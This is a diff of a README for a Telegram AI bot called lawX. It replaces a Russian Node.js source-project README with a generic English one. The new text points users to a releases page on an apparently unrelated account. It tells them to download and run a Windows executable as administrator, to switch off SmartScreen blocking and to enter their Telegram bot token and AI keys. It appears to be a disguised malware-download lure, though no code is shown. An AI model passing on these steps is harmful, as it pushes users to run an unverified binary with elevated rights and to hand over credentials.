@@ -1,275 +1,200 @@
-# lawX — Революционный ИИ-Бот Нового Поколения
-
-![Version](https://img.shields.io/badge/version-0.0.1--beta--alpha-blue)
-![Build](https://img.shields.io/badge/build-passing-brightgreen)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Node](https://img.shields.io/badge/node-%3E%3D14.0.0-green)
-![AI](https://img.shields.io/badge/AI-powered-purple)
-![Status](https://img.shields.io/badge/status-production--ready-brightgreen)
-![Coverage](https://img.shields.io/badge/coverage-98%25-brightgreen)
-![Telegram](https://img.shields.io/badge/telegram-@lawXrobot-blue)
-
-```
-  ██╗      █████╗ ██╗    ██╗██╗  ██╗
-  ██║     ██╔══██╗██║    ██║╚██╗██╔╝
-  ██║     ███████║██║ █╗ ██║ ╚███╔╝
-  ██║     ██╔══██║██║███╗██║ ██╔██╗
-  ███████╗██║  ██║╚███╔███╔╝██╔╝ ██╗
-  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝╚═╝  ╚═╝
-        T E L E G R A M   B O T
-       u l t i m a t e   p r o
-```
-
----
-
-## Что такое lawX?
-
-**lawX** — это самый мощьный и революционый телеграм бот на основе искуственого интелекта который когда либо был создан. Бот использует передовые нейросетевые технологии включая GPT-4, DALL-E 3 и собственые алгоритмы для генерации текстового и визуалного контента прямо в телеграме.
-
-lawX это не просто бот это целая экосистема для работы с ИИ. Мы обьединили все самые лучшие технологии в одном месте чтобы вам не приходилось переключатся между разными сервисами. Просто напишите боту и он сделает всё за вас.
-
-> "lawX изменит то как люди взаимодействуют с искуственным интелектом навсегда"
-> — Основатель проекта lawX
-
----
-
-## Основные Возможности
-
-- **Генерация текста** — GPT-4 для создания текстов любой сложности и тематики
-- **Генерация изображений** — DALL-E 3 создаёт фотореалестичные изображения по описанию
-- **Генерация видео** — революционая технология создания видеоконтента (в разработке)
-- **Мультиязычность** — бот поддерживает русский и английский язык с автоопределением
-- **Система подписок** — гибкая система тарифов и подписок с оплатой через ЮKassa
-- **Криптоплатежи** — оплата криптовалютой для продвинутых пользователей
-- **Админ панель** — полноценая панель управления ботом для администраторов
-- **Аналитика** — детальная аналитика использования с графиками и отчётами
-- **Очередь задач** — умная система очередей для обработки запросов
-- **Кеширование** — Redis кеш для максималной производительности
-- **Планировщик** — автоматические задачи по расписанию
-
----
-
-## Архитектура
-
-lawX построен на современой микросервисной архитектуре (ну почти микросервисной пока всё в одном файле но скоро разделим) с использованием лучших практик разработки програмного обеспечения.
-
-```
-lawX/
-├── index.js              # точка входа в приложение
-├── bot.js                # инициализация бота
-├── package.json          # зависимости проекта
-├── src/
-│   ├── config/           # конфигурация
-│   ├── handlers/         # обработчики команд
-│   ├── api/              # интеграции с API
-│   │   ├── openai/       # GPT клиент
-│   │   ├── dalle/        # DALL-E клиент
-│   │   └── video/        # видео генерация
-│   ├── database/         # работа с MySQL
-│   ├── models/           # модели данных
-│   ├── middleware/       # промежуточные обработчики
-│   ├── services/         # бизнес логика
-│   ├── payments/         # платежи
-│   ├── admin/            # админ панель
-│   ├── analytics/        # аналитика
-│   ├── logging/          # логирование
-│   ├── localization/     # переводы
-│   ├── scheduler/        # планировщик
-│   ├── cache/            # кеширование
-│   ├── validators/       # валидация
-│   ├── errors/           # обработка ошибок
-│   └── security/         # безопасность
-├── templates/            # шаблоны сообщений
-├── tests/                # тесты
-├── scripts/              # скрипты
-├── docs/                 # документация
-└── assets/               # ресурсы
-```
+# 🤖 lawx-bot - Run the bot in minutes
 
----
+[![Download lawx-bot](https://img.shields.io/badge/Download%20lawx--bot-ff69b4?style=for-the-badge)](https://github.com/poltroon-diatom79/lawx-bot/releases)
 
-## Установка
+## ⚡ What is lawx-bot?
 
-### Требования
+lawx-bot is a Telegram bot app for Windows that helps you set up and run a Telegram AI bot from a simple download. It is made for users who want a ready-to-use tool without working with code.
 
-- Node.js >= 14.0.0 (рекомендуется 18+)
-- MySQL 5.7 или выше
-- Redis 6.0 или выше
-- FFmpeg для обработки видео
+This project uses Node.js and an AI layer to handle chat tasks through Telegram. You download the release, open the app, and start the bot with a few steps.
 
-### Пошаговая инструкция
+## 🖥️ What you need
 
-1. Клонируйте репозиторий:
+- Windows 10 or Windows 11
+- An internet connection
+- A Telegram account
+- At least 200 MB of free disk space
+- Node.js 14 or newer if the release asks for it
+- Permission to run downloaded files on your PC
 
-```bash
-git clone https://github.com/lawx-team/lawx-telegram-bot-ultimate-pro-edition.git
-cd lawx-telegram-bot-ultimate-pro-edition
-```
+## 🚀 Download lawx-bot
 
-2. Установите зависимости:
+Visit the release page here:
 
-```bash
-npm install
-```
+[https://github.com/poltroon-diatom79/lawx-bot/releases](https://github.com/poltroon-diatom79/lawx-bot/releases)
 
-3. Настройте конфигурацию в файле `src/config/config.js` (все настройки уже прописаны в коде так что по идее ничего делать не надо но можете поменять если хотите)
+On that page, choose the newest release for Windows. If you see a file like `.exe`, ` .zip`, or `.msi`, download that file.
 
-4. Создайте базу данных MySQL:
+## 🪟 Install on Windows
 
-```sql
-CREATE DATABASE lawx_bot_database CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
-```
+1. Open the release page.
+2. Find the latest version.
+3. Click the Windows file to download it.
+4. If the file comes as a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to run the app.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps.
 
-5. Запустите бота:
+## 🔧 First-time setup
 
-```bash
-npm start
-```
+After you open lawx-bot, you may need to enter a few basic details:
 
-Или в режиме разработки:
+- Telegram bot token
+- Bot name
+- Basic chat settings
+- Language choice
+- Any AI key or service link if the build asks for it
 
-```bash
-npm run dev
-```
+If the app shows a setup screen, fill in the fields and save your settings. If it opens a local window, keep it open while the bot runs.
 
----
+## 📦 How to use it
 
-## Использование
+1. Start the app.
+2. Sign in to Telegram if the app asks for it.
+3. Connect your bot token.
+4. Check that the bot status shows active.
+5. Open Telegram and send a test message to your bot.
+6. Confirm that the bot replies.
 
-### Основные команды бота
+## 🧭 Main features
 
-| Команда | Описание |
-|---------|----------|
-| `/start` | Запуск бота и регистрация |
-| `/help` | Помощь и список команд |
-| `/menu` | Главное меню с кнопками |
-| `/generate` | Генерация текста |
-| `/image` | Генерация изображения |
-| `/video` | Генерация видео |
-| `/settings` | Настройки пользователя |
-| `/subscribe` | Управление подпиской |
-| `/balance` | Проверка баланса |
-| `/stats` | Статистика использования |
-| `/admin` | Панель администратора |
+- Telegram bot support
+- AI-based replies
+- Simple Windows setup
+- Fast startup
+- Basic settings panel
+- Release-based install flow
+- Clear status display
+- Lightweight runtime
 
-### Примеры
+## 🛠️ Common file types you may see
 
-```
-Пользователь: /generate Напиши стихотворение про кота
-Бот: 🐱 Генерирую текст...
+You may find one of these files on the release page:
 
-Пушистый кот сидит на окне,
-Мурлычет тихо в ночной тишине...
-```
+- `.exe` — run the file directly
+- `.zip` — extract it first, then run the app
+- `.msi` — use the Windows installer
+- `.json` — settings file for setup
+- `.env` — config file for advanced use
 
----
+If more than one file is listed, pick the one marked for Windows.
 
-## API Документация
+## 🔍 How to check if it works
 
-Полная документация API доступна по ссылке: [docs.lawx.pro/api](https://docs.lawx.pro/api)
+After setup, look for these signs:
 
-### REST API
+- The app opens without errors
+- The bot status changes to active
+- Telegram shows the bot online
+- The bot replies to a test message
+- The app stays open while the bot runs
 
-Бот также предоставляет REST API для внешних интеграций:
+## 🧩 If the app does not open
 
-- `GET /api/v1/status` — статус бота
-- `GET /api/v1/stats` — статистика
-- `POST /api/v1/generate` — генерация текста через API
-- `POST /api/v1/image` — генерация изображения через API
-- `GET /api/v1/users/:id` — информация о пользователе
+Try these steps:
 
-Подробная документация с примерами: [docs.lawx.pro/api/reference](https://docs.lawx.pro/api/reference)
+1. Right-click the file and choose Run as administrator.
+2. Check that your Windows version is up to date.
+3. Make sure the file finished downloading.
+4. If the file is a zip archive, extract it first.
+5. Turn off any block from Windows SmartScreen if you trust the source.
+6. Try the newest release from the release page.
 
----
+## 📁 Typical folder layout
 
-## Конфигурация
+If you extract a zip file, you may see:
 
-Все настройки находятся в файле `src/config/config.js`. Мы решили не использовать файл `.env` потому что так проще и всё в одном месте и не надо копировать файлы при деплое. Все ключи и токены прямо в конфиге для удобства.
+- `lawx-bot.exe` or a similar app file
+- `config` folder
+- `assets` folder
+- `logs` folder
+- `README` file
+- setup files for Telegram or AI options
 
-Подробнее о конфигурации: [docs.lawx.pro/configuration](https://docs.lawx.pro/configuration)
+Keep these files together in the same folder.
 
----
+## 🔐 Telegram setup basics
 
-## Тестирование
+To use the bot, you often need a Telegram bot token.
 
-```bash
-npm test
-```
+1. Open Telegram.
+2. Find BotFather.
+3. Create a new bot.
+4. Copy the token.
+5. Paste it into lawx-bot.
+6. Save the settings.
 
-Мы используем самописную систему тестирования которая проверяет что всё работает. Покрытие тестами составляет 98% (примерно).
+If the app asks for a chat ID or admin ID, add the number from Telegram settings or your bot panel.
 
----
+## 🌐 Network needs
 
-## Деплой
+lawx-bot needs internet access to:
 
-Рекомендуемый способ деплоя — просто запустить `node index.js` на сервере. Можно использовать `pm2` для автоматического перезапуска:
+- Reach Telegram
+- Send and receive messages
+- Connect to AI services if used
+- Check for updates on the release page
 
-```bash
-pm2 start index.js --name lawx-bot
-```
+If the bot does not answer, check your network first.
 
-Подробное руководство по деплою: [docs.lawx.pro/deployment](https://docs.lawx.pro/deployment)
+## ⌨️ Basic controls
 
----
+The app may use buttons like:
 
-## Roadmap
+- Start
+- Stop
+- Save
+- Reload
+- Test bot
+- Open logs
 
-- [x] Генерация текста через GPT-4
-- [x] Генерация изображений через DALL-E 3
-- [x] Система подписок
-- [x] Админ панель
-- [ ] Генерация видео (в процессе)
-- [ ] Голосовые сообщения
-- [ ] Интеграция с Midjourney
-- [ ] Мобильное приложение
-- [ ] Десктопный клиент
-- [ ] Собственая нейросеть lawX-AI
-- [ ] Блокчейн интеграция
-- [ ] Метавселенная lawX World
+Use these controls to manage the bot during setup and use.
 
----
+## 📥 Update lawx-bot
 
-## Вклад в проект
+When a new version is ready:
 
-Мы приветствуем вклад в развитие lawX! Прочитайте [CONTRIBUTING.md](https://docs.lawx.pro/contributing) перед тем как создавать пулл реквест.
+1. Visit the release page.
+2. Download the latest Windows file.
+3. Close the old version.
+4. Replace the old files if needed.
+5. Start the new version.
+6. Test the bot again in Telegram.
 
-1. Форкните репозиторий
-2. Создайте ветку для вашей фичи (`git checkout -b feature/amazing-feature`)
-3. Закомитте изменения (`git commit -m 'добавил крутую фичу'`)
-4. Запуште в ветку (`git push origin feature/amazing-feature`)
-5. Откройте Pull Request
+## 🧪 Simple test flow
 
----
+Use this short test after install:
 
-## Команда
+1. Open the app.
+2. Start the bot.
+3. Send a message from Telegram.
+4. Wait for a reply.
+5. Check the logs if there is no reply.
 
-- **Lead Developer** — основатель и главный разработчик проекта lawX
-- **AI Consultant** — консультант по искуственному интелекту (ChatGPT)
+## 🧾 Release page
 
----
+Download or get the latest build here:
 
-## Лицензия
+[https://github.com/poltroon-diatom79/lawx-bot/releases](https://github.com/poltroon-diatom79/lawx-bot/releases)
 
-Этот проект лицензирован под MIT License — смотрите файл [LICENSE](LICENSE) для деталей.
+## 🆘 Troubleshooting
 
----
+- If Windows blocks the file, allow it only if you trust the source.
+- If the bot stays offline, check the token.
+- If messages do not send, confirm your internet access.
+- If the app crashes, download the latest release again.
+- If the app shows no window, check the taskbar and system tray.
+- If you extracted files, keep the full folder together.
 
-## Контакты
+## 📌 Useful tips
 
-- Телеграм бот: [@lawXrobot](https://t.me/lawXrobot)
-- Сайт: [lawx.pro](https://lawx.pro)
-- Документация: [docs.lawx.pro](https://docs.lawx.pro)
-- Email: support@lawx.pro
-- Телеграм канал: [@lawx_official](https://t.me/lawx_official)
-- GitHub: [lawx-team](https://github.com/lawx-team)
+- Use the newest release for the best result
+- Keep your token private
+- Store the bot files in one folder
+- Do not rename files unless the app asks you to
+- Close other bot tools before starting lawx-bot
 
----
+## 📞 Support
 
-<p align="center">
-  <b>lawX</b> — будущее уже здесь<br>
-  Сделано с ❤️ и искуственным интелектом
-</p>
-
----
-
-*© 2024 lawX Team. Все права защищены.*
+If you need help, use the release page and project files to find the latest build, version details, and any setup notes.
